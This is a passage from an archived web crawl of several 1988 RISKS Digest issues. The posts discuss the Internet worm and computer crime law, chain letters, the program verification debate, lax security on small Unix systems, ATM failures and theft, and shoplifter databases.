Technology Committee, and William Hughes, chairman of the crime subcommittee
of the House Judiciary Committee, say they want to know more about the 
self-replicating program that invaded thousands of computer systems.
  The two chairmen, both from New Jersey, say the are concerned about how 
existing federal law applies to the Nov. 2 incident in which a 23-year-old
computer prodigy created a program that jammed thousands of computers at
universities, research centers, and the Pentagon.
  Roe said his committee also will be looking at ways to protect vital
federal computers from similar viruses.
  `As we move forward and more and more of our national security is dependent
on computer systems, we have to think more about the security and safety of
those systems,' Roe said.
  Hughes, author of the nation's most far-reaching computer crime law, said
his 1986 measure is applicable in the latest case.  He said the law, which
carries criminal penalties for illegally accessing and damaging `federal
interest' computers, includes language that would cover computer viruses.
  `There is no question but that the legislation we passed in 1986 covers the
computer virus episodes,' Hughes said.
  Hughes noted that the law also includes a section creating a misdemeanor 
offense for illegally entering a government-interest computer.  The network
invaded by the virus, which included Pentagon research computers, would 
certainly meet the definition of a government-interest computer, he said.
  `The 1986 bill attempted to anticipate a whole range of criminal activity
that could involve computers,' he said.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computer Literacy #3
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@juicy-juice.lcs.mit.edu ">
ronni@juicy-juice.lcs.mit.edu 
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 12:36:39 EST
</i><PRE>

Expenditures of time and money on computer-literacy education represent
important tradeoffs for schools.  If you think that computer literacy should
be taught in school, how do you think schools should pay for it (hardware,
software, training, maintenance)?  How should computer-literacy courses be fit
into the school day?

Since school budgets and days are finite, these questions raise the issue of
priorities.  Should computer-literacy education be a high priority for our
education system?  Why or why not?  How do you compare computer literacy with
current education priorities?

     [Respond to Ronni, please.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
More on misuses of computers 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:Neumann@csl.sri.com">
Neumann@csl.sri.com
</A>&gt;
</address>
<i>
28 Nov 1988 17:17:10-PST
</i><PRE>

A flurry of risks relating to antisocial computer uses has been rapidly
developing into a blizzard:

  * Hatred-promoting materials.  Jeff Stout (jstout@boeing.com) alerted me to
    an article in the Seattle Times/Post-Intelligencer, 11/20/88, excerpted
    as follows:

      The rapid spread in recent months of illegally produced floppy disks
      with anti-Semitic and racist content, promoted by the increased use of
      home computers, has alarmed West German teachers and those concerned
      with protecting young people from exposure to military, racist and
      pornographic violence.

      The neo-Nazi underground has changed tactics", says Gerhard Adams,
      deputy chairman of the government office responsible for monitoring
      "youth-endangering" materials.  "Instead of distributing leaflets,
      they now circulate in schools computer programs which are anti-Semitic
      and racist."  [...]

      While the majority of games glorifying war and Rambo-style episodes of
      self-enforced law are produced in the United States and Great Britain,
      games inciting racial hatred and propagating Nazi ideology are
      believed to have their origin in Germany.

  * A flurry of PC porno programs (including some highly interactive versions).
    For example, a porno program is apparently sweeping through the banking
    community (Lounge-suit Larry ...), some versions of which are Trojan
    horsed and rather destructive.  Many others have also been reported,
    and with pirating and direct propagation seem to be spreading rampantly.

  * Electronic chain letters such as that noted in the following message.

So, what is new?  The subject matter is certainly not new.  But the medium
offers new opportunities -- proliferability, programmability, and privacy.
(Next we will be having subliminal messages on the screen, or even buried
inside the programs?)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Chain letters = next net disaster ?
</A>
</H3>
<address>
Ira Baxter 
&lt;<A HREF="mailto:baxter@madeleine.ICS.UCI.EDU">
baxter@madeleine.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Fri, 25 Nov 88 23:37:04 -0800
</i><PRE>

Just received this.  Figured best way to a) satisfy RISKS readers and b)
"prevent breaking the chain" :-} was to submit this rather than victimize 20
more people.  If this sort of thing is turned loose in email, the resulting
exponential explosion could be as bad as the recent net worm (with willing
vectors, anyhow).  Unwilling vectors will just damp them out... but with 3
million PCs out there, how many do we need to keep it alive?

  [RISKS has no difficulty whatever in breaking this chain.  Chain letters
   are bad enough via SnailMail, but electronically they open up horrible
   possibilities.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computerized Parking Meters
</A>
</H3>
<address>
James Peterson 
&lt;<A HREF="mailto:peterson@sw.MCC.COM">
peterson@sw.MCC.COM
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 16:40:05 CST
</i><PRE>

While visiting the University of Oregon last summer, I found a parking space
with no meter, but a sign directing me around the corner.  There was a small
terminal with a map of the adjacent parking area, about 14 spaces along the
side of the street.  The instructions indicated that the money was to be
deposited and the code number for my parking space keyed in.  Out popped a
little printed ticket with my parking space number and the time, date, etc
when I arrived and how long before my parking expired.  It's the only time
I've seen such a system (instead of the normal mechanical parking meters).

I assume the benefits of the system are that there is a centralized station
for checking what cars are legally parked (the meter maid doesn't have to
check each spot, but one central location), central collection of money,
and if one car pays for an hour but leaves after 10 minutes, there is no
visible record allowing the next car to just use the remaining 50 minutes
without paying for it.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Data verification
</A>
</H3>
<address>
Rob Gross
&lt;<A HREF="mailto:    <GROSS%BCVMS.BITNET@MITVMA.MIT.EDU> ">
    &lt;GROSS%BCVMS.BITNET@MITVMA.MIT.EDU&gt; 
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 20:58 EST
</i><PRE>

At Boston College, most faculty members are expected to advise between ten
and twenty students.  For various reasons (students requesting new advisors,
faculty members on leave, students changing majors), the students I advise
one semester often are not my responsibility by the time the next semester
rolls around.  So I wasn't too surprised when I received a call from a
student I had advised in September asking for an appointment to see me; I
told her that she was no longer one of my advisees, and suggested that she
call the dean to find out who her advisor was.

She called back an hour later and told me that she had been entered into the
computer as class of 1993, and the computer had duly scheduled her to
register in November of 1989.

And my computer science students worry about why I stress data verification!

Rob Gross    

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.82.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.84.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-36</DOCNO>
<DOCOLDNO>IA012-000131-B035-262</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.84.html 128.240.150.127 19970217024114 text/html 21287
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:39:34 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 84</TITLE>
<LINK REL="Prev" HREF="/Risks/7.83.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.85.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.83.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.85.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 84</H1>
<H2> Tuesday 29 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
"Program Verification: The Very Idea", by J.H. Fetzer 
</A>
<DD>
<A HREF="#subj1.1">
Nancy Leveson et al.
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Internet Worm Tech Report 
</A>
<DD>
<A HREF="#subj2.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Purchasers of computer systems as causes of the Internet worm    
</A>
<DD>
<A HREF="#subj3.1">
Brandon S. Allbery
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Bank of America ATMs Hit a Glitch 
</A>
<DD>
<A HREF="#subj4.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Corps of Software Engineers? 
</A>
<DD>
<A HREF="#subj5.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Software Uniformity Legislation 
</A>
<DD>
<A HREF="#subj6.1">
Colin M Thomson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Zapping shoplifters in Minnesota 
</A>
<DD>
<A HREF="#subj7.1">
Scot E Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  (Counter-)corrective control systems 
</A>
<DD>
<A HREF="#subj8.1">
Jeffrey R Kell
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"Program Verification: The Very Idea", by J.H. Fetzer
</A>
</H3>
<address>
&lt;<A HREF="mailto:leveson@electron.LCS.MIT.EDU">
leveson@electron.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 29 Nov 88 07:11:44 -0500
</i><PRE>

In <A HREF="/Risks/7.61.html">RISKS-7.61</A>, Brian Randell recommended a paper by J.H. Fetzer in the
Communications of the ACM vol 31, no 9 (Sept. 88), pp. 1048-1063.  There has
been no reply in the RISKS Forum, and some people have apparently interpreted
this absence as everyone's agreement with Brian's view of the paper.  It should
be noted, however, that the paper has created great outrage among many in the
research community due to its misstatements and distortion of the goals of
formal verification, the seemingly low level of knowledge and understanding by
the author about formal verification (e.g., misstatements such as the
implication that it is only applicable to high-level languages and the lack of
references to the verification literature and work of the past 20 years), the
inclusion of inflammatory and unsupported statements (e.g., that the practice
of program verification somehow has serious negative consequences ``not only
for the community of computer science, but for the human race''), and the
general argument that deductive reasoning is not appropriate for computer
programs -- which has implications far beyond just formal verification.

Formal, mathematical approaches to system construction and analysis are
directly motivated by the concern to construct trustworthy systems -- systems
whose developers will be willing to stand before the public and take
responsibility for the consequences of their deployment.  As yet, this goal is
unrealized, but research in formal verification is a serious contribution
toward that goal and is both socially and scientifically responsible.  Serious
and well-informed discussion of the limitations to formal verification, and of
its strengths and defects relative to other responsible proposals for the
construction of trustworthy systems, is entirely appropriate and would, we are
sure, be welcomed by the supporters of formal verification.  In fact, many in
the field have themselves been the leaders of such discussion (e.g., see the
recent discussion by Avra Cohn, ``Correctness Properties of the Viper Block
Model'', Cambridge University, England, 1988, regarding her own verification of
the Viper microprocessor, and several papers in the book "Mathematical Logic
and Programming Languages" that was published on the occasion of C.A.R. Hoare
being named to the Royal Society).  However, ill-informed and irresponsible
attacks upon work that attempts to make computer science a socially-responsible
engineering endeavor do not seem to us to be useful or productive.

                      Mark Ardis, Software Engineering Institute
                      Victor Basili, University of Maryland
                      Daniel Craigen, I.P. Sharp
                      Susan Gerhart, MCC
                      Donald Good, Computational Logic Inc.
                      David Gries, Cornell University
                      Dick Kemmerer, University of California, Santa Barbara
                      Nancy Leveson, University of California, Irvine
                      John McHugh, Computational Logic Inc.
                      Peter Neumann, SRI International
                      Friedrich von Henke, SRI International

       [Other anticipated signatories were not available for final sign-off.]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Internet Worm Tech Report [Risks of Offering Popular Reports]
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Tue, 29 Nov 88 16:30:12 EST
</i><PRE>

    [In response to a query as to why Purdue FTP stopped working today:]

We're off the air because we had 42 ftp processes running at once, and
the ftp daemon got hung.  We now need to reboot the machine to clear it,
but that means kicking over 100 users off (this is a 10 processor
Sequent Symmetry).  So, we're waiting until later this afternoon
until people have gone home for dinner, etc.

    [OK, folks, let's show a little restraint.  I picked up a copy in the
    off hours yesterday.  But FTP FLOOD is clearly just one more denial of
    service problem that must be anticipated in setting system parameters...  

    By the way, ALL of the Arpanet/Milnet mail bridges have been today, 
    reportedly due to "technical difficulties".  PGN]
    
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Purchasers of computer systems as causes of the Internet worm
</A>
</H3>
<address>
Brandon S. Allbery
&lt;<A HREF="mailto:allbery@ncoast.UUCP ">
allbery@ncoast.UUCP 
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 21:29:06 -0500
</i><PRE>
Comment: Revision of earlier news.sysadmin posting

A bit of biographical commentary:  I am a consultant and programmer who
specializes in systems administration and DBMS systems.  This puts me in a
position to see how our clients manage their computer systems.  For those who
are interested, we handle Altos X86 systems, SCO Xenix, and the occasional 3B/2
and even more occasional other small UNIX systems.

I should note that the term "Standard Security Speech" is used sarcastically;
insofar as our clients are concerned, it's more of a rant about something that
"can't possibly apply to them."  It's not written down or otherwise formalized;
its content is as variable as the security problems at each client site.

And the context, from the Usenet newsgroup news.sysadmin:

  As quoted from &lt;563@husc6.harvard.edu&gt; by reiter@endor.harvard.edu (Ehud Reiter):
  +---------------
  | I think the vendors bear the lion's share of guilt in this affair.
  | Why the ---- didn't Sun and friends fix these security holes ages ago?
  +---------------

That portion of my response which is relevant to RISKS follows.  ++bsa

  --------

I can answer this, perhaps not for Sun but in general.

I've annoyed many a client with "Standard Security Speech #1", discussing
the importance of not running all their programs from an unpassworded "root"
login.  And many of those clients have modems.  I didn't realize just how
bad the situation was until one of those clients argued back that they
bought an ***** (name deleted to avoid advertising) system because a
business associate had compained about &amp;&amp;&amp;&amp;'s not allowing "root" to log in
on non-console terminals.  Why was this so bad?  "We don't want to have our
users be restricted in what they can do."

The logic of these sysadmins is simple and extremely dangerous:  People are
ignorant about computers.  People don't want security.  People want to load
their applications into their computers and trust that god will keep the
crackers out.  And there have been cases when a company will refuse to buy a
particular computer because it comes with security enforcement.

The vendors have made mistakes, certainly.  But their customers have a nasty
tendency to consider these mistakes to be features.  Common arguments used
by these people when confronted with the flaws in their reasoning:

"Nobody knows our computer's phone number." -- Demon-dialer programs are
  trivial, especially when used with smart modems that can recognize voice
  answers.

"We don't have any information that anyone would want." -- Fine, so you
  don't have to worry about industrial espionage.  This would not have
  bothered in the least the cracker gang that was broken by the FBI earlier
  this year, that operated in the Cleveland area [where I live], much less
  interstate gangs courtesy PC Pursuit or that West German group that used
  an improperly installed Gnumacs to break into systems.

"It {won't,can't} happen to us." -- Needs no commentary.  Ask any sysadmin
  on the Internet.

Worse is that almost *every* small Un*x system out there has NO security,
because the salespeople that installed them and set them up didn't know
about it.  They have everyone run as unpassworded root.  They load
applications into /tmp, where any cracker can destroy the entire system with
just ONE publicly-executable "rm".  They don't say word one about backup
procedures.  And many of them don't give their customers the master disks to
their software, so if their programs get blasted they're gone for good.

That last paragraph is the worst part.  We work primarily with reasonably
pure Xenix and Unix System V -- no sendmail, no fingerd, no ftpd, no
susceptibility to the *current* worm.  And capable of quite good security.
But setting up security takes some work -- it always has, it always will --
and most salespeople are too busy counting their commissions to consider
doing that work.  If they even know anything about security, which I would
doubt after some of the things I've seen.  And even if they did, the people
mentioned above would forbid it.  (Did I mention the system administrator
who told me that he had his people running as root because he didn't want
them to be stuck in a restricted shell?  No, he didn't mean /bin/rsh.)

The Internet worm is well on its way to becoming the kernel of my "Standard
Security Speech #2".  Maybe a few people will pay attention this time; one of
*****'s failures is that systems ship with a "uucp" login enabled and security
disabled even in HDB UUCP.  All it'd take is a UUCP version of the Internet
worm and a demon-dialer program to wreak havoc in these small systems.

Vendors have some blame, but their oh-so-naively-trusting customers and
oh-so-ignorant salespeople (or distributors' salespeople, who the vendors have
no control over) have even more.  Education is the answer here.  It is a sad
but true fact that only an actual invasion of their systems will get any
response out of them.

			Brandon S. Allbery, Telotech, Inc.
Brandon S. Allbery, comp.sources.misc moderator and one admin of ncoast PA UN*X
uunet!hal.cwru.edu!ncoast!allbery &lt;PREFERRED!&gt;	 ncoast!allbery@hal.cwru.edu
allberyb@skybridge.sdi.cwru.edu	 &lt;ALSO&gt;		 allbery@uunet.uu.net
comp.sources.misc is moving off ncoast -- please do NOT send submissions direct
      Send comp.sources.misc submissions to comp-sources-misc@&lt;backbone&gt;.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Bank of America ATMs Hit a Glitch
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>

</i><PRE>

A computer malfunction at BoA's main data center appears to have shut down
all of the bank's 1450 automated teller machines in California for three
hours on Sunday afternoon, 27 Nov 88 (normally a very busy day).  The
shutdown also affected BofA customers throughout the country.  [Source: San
Francisco Chronicle, 29 Nov 88, p. C1, article by Kenneth Howe]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Corps of Software Engineers?
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 29 Nov 88 02:02:48 EST
</i><PRE>

Just noticed in an old Aviation Week editorial (Oct 17):

	"Flexibility is software's strong suit, allowing the military
	to make changes in how a weapon system functions, even after
	it is fielded... [discussion of gratuitous changes deleted]
	...making changes in a hurry during a conflict is imperative
	if software is to help US forces prevail."

	"Traditionally, armies have had combat engineers to build
	makeshift bridges, ports, and even airfields in a hurry.
	But where is the US corp of software engineers that can fix
	a key software module quickly so the next airstrike can
	account for an unexpected SAM threat?  Do the armed services
	expect contractor personnel to volunteer for duty on the
	front lines?  Clearly some minimal level of expertise is
	needed in the field and on board ship to make sure that
	weapons systems programs can accommodate unexpected
	circumstances... there is too much riding on software and
	too little expertise in the military to deal with it."

                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Software Uniformity Legislation
</A>
</H3>
<address>
Colin M Thomson 
&lt;<A HREF="mailto:CMTA@gm.rl.ac.uk">
CMTA@gm.rl.ac.uk
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 16:06 GMT
</i><PRE>

Conleth O'Connell sent a note to the soft-eng list about US uniformity
legislation for software.

I guess there's a risk lurking in there. Either we get legislation appropriate
to life-critical software, and all the commercial games outfits go bust, or we
end up with nuclear reactors and flight control systems required to meet
mickey-mouse standards.  Maybe the legislators will try to classify software,
and set up rules appropriate to different sorts of products; if they do, will
they get it right?
                          Tom Thomson, ICL, Manchester M12 5DR, UK
                          tom@prg.ox.ac.uk cmta@alvey.uk
***** VIEWS EXPRESSED ABOVE MAY NOT CONFORM WITH THOSE OF MY EMPLOYER *****

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Zapping shoplifters in Minnesota
</A>
</H3>
<address>
Scot E Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.mn.org ">
sewilco@datapg.mn.org 
</A>&gt;
</address>
<i>
29 Nov 88 11:11:40 CST (Tue)
</i><PRE>

RISKS has already reported on the possibilities of cash registers reporting
the purchases of individuals to marketing databases.  Some Minnesota stores
are now using electronic technology to monitor thieves during individual
crimes and at a higher level.

A new superstore recently opened in this area.  While reporters were waiting
for a demonstration of the security system, an actual theft demonstrated it.
In addition to security agents on the shopping floor and the now-common TV
cameras, purchases made on the electronic cash registers can be monitored by
the security office.  This allows actual thieves to be confronted outside
the store without disturbing legitimate customers (I refer to "false alarms",
as the need for a paper record of purchases and confirmation by the clerk
will disrupt the use of that cash register after its use by a thief).

Minnesota police have noticed that some shoplifters have been getting caught
for many small thefts in different counties.  Minnesota law allows many small
losses during a six-month period to be added together, and if the total
exceeds the minimum for a felony the thief may be charged with a felony.
Police and major retailers are now sharing information on shoplifters so
they can more severely prosecute the professional shoplifter.  A database
in a computer is being used to track the totals.

Anyone with access to the security system line from the cash registers can
more conveniently gain information about any customer.  Other than its
invisibility, this is not much worse than the information disclosed to the
clerks or the other persons waiting in line.  However, if a store does not
already use the purchase information for marketing purposes, the installed
equipment can easily deliver information to a marketing system.

The thief database is more of a threat to thieves than to the general
public, except of course in cases of mistaken identity.

Scot E. Wilcoxon, Data Progress, Minneapolis, MN   +1 612-825-2607
sewilco@DataPg.MN.ORG    {amdahl|hpda}!bungia!datapg!sewilco

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
     (Counter-)corrective control systems
</A>
</H3>
<address>
Jeffrey R Kell 
&lt;<A HREF="mailto:JEFF@UTCVM.BITNET">
JEFF@UTCVM.BITNET
</A>&gt;
</address>
<i>
Wed, 23 Nov 88 11:23:40 EST
</i><PRE>

Last week, our operator informed me that our laser printer was indicating
a low voltage condition.  Indeed, the expected 240v was down to 214v, just
below the 216v minimum allowed by the controller software.  We contacted
physical plant, who in turn discovered the building mains were also low.
Next in line was the power board, who reluctantly investigated and after
some deliberation and delay concluded that it was within their limits.
This continued until we contacted the second shift supervisor at the power
board and confirmed that the voltage was 10% below nominal.  They tweaked
the appropriate substation and voltage came back to normal.

On the following morning, the low 214v returned.  Similar iterations of
the previous day followed, and voltage again restored late that afternoon.

Next morning, as you might guess, 214v again, etc.

Eventually the power board's two shifts finally communicated.  There was
a bad (miscalibrated) sensor at some point showing a higher voltage than
was really there.  This was known to the second shift crew, who compensated
accordingly (without correcting the sensor); but first shift was taking the
reading verbatim.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.83.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.85.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-37</DOCNO>
<DOCOLDNO>IA012-000131-B035-300</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.85.html 128.240.150.127 19970217024158 text/html 13267
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:40:09 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 85</TITLE>
<LINK REL="Prev" HREF="/Risks/7.84.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.86.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.84.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.86.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 85</H1>
<H2> Thursday 1 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Security Pacific Automated Teller Theft  
</A>
<DD>
<A HREF="#subj1.1">
PGN and Stan Stahl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Corps of Software Engineers? 
</A>
<DD>
<A HREF="#subj2.1">
Dave Parnas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Telecommunications, Data Entry and Worker Exploitation 
</A>
<DD>
<A HREF="#subj3.1">
Larry Hunter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Milnet Isolation 
</A>
<DD>
<A HREF="#subj4.1">
John Markoff via Geoff Goodfellow
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Security Pacific Automated Teller Theft 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 30 Nov 1988 11:21:32 PST
</i><PRE>

Security Pacific National Bank acknowledged that nearly $350,000 was stolen on
11-13 November from about 300 customer accounts.  A specially privileged
"passkey" card may have been used from various LA-area ATMs to gain access to
each of these accounts, without requiring the PIN number and without being
subject to the daily limits on individual accounts.  (One person reportedly had
$1200 taken on a single day, in 4 installments) [Source: Los Angeles Times
adaptation in S.F. Chronicle, 30 Nov 88, p. A6]

"Any system can be beaten," said a security official at another Los Angeles
bank when told of the loss.  [...]  A security official at another Los Angeles
bank, however, discounted the idea of a passkey.  He did say that such a theft
would almost certainly require inside knowledge.  [From the original LA Times
article by Douglas Frantz, Times Staff Writer, contributed by Stan Stahl
(Stahl@DOCKMASTER.ARPA)]

  [Superuser-type trapdoor mechanisms may be more useful for illegitimate
  purpose than for legitimate purposes.  Having spent many years designing
  structured systems that were sufficiently flexible WITHOUT having such
  mechanisms, I wonder why systems with relatively omnipotent trapdoors
  continue to be used in critical applications.  The existence of such an
  ATM trapdoor seems highly unnecessary, and is clearly an invitation to
  misuse.  Maintenance interfaces should be subjected to security and
  integrity controls, separation of duties, principle of least privilege,
  etc., just like everything else.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Corps of Software Engineers? (<A HREF="/Risks/7.84.html">RISKS-7.84</A>)
</A>
</H3>
<address>
Dave Parnas
&lt;<A HREF="mailto:parnas@qucis.queensu.ca ">
parnas@qucis.queensu.ca 
